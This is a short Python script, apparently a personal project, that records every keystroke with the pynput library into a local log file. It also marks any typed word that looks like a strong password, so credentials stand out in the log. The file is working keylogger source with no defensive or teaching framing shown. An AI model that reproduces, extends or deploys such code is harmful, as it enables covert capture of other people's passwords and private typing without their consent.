from pynput import keyboard
import datetime
import re

#file path
FILE_PATH = "C:/Users/imclp/OneDrive/Desktop/projects/kyg/log.txt"

def check_pass(password) -> bool:
    pattern = r"^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$"
    match = re.match(pattern, password)
    return bool(match)

word = ""
def keyPressed(key):
    global word,FILE_PATH
    with open(FILE_PATH,'a') as logKey:
        try:
            if hasattr(key, 'char'):  # Regular character
                word += key.char
                logKey.write(key.char)
            elif key == keyboard.Key.space:  # Space
                if check_pass(word):
                    logKey.write("¿")
                logKey.write(" ")

                word = ""
            '''elif key == keyboard.Key.enter:  # Enter
                if check_pass(word):
                    logKey.write("¿")
                logKey.write("\n")
                word = ""'''
        except Exception as e:
            print("Error:", e)


if __name__ == "__main__":
    with open(FILE_PATH,'a') as file:
        try:
            file.write("\n" + str(datetime.datetime.now()))
            file.write("\n")
            file.close()
        except:
            print("datetime error")
    listner = keyboard.Listener(on_press = keyPressed)
    listner.start()
    input()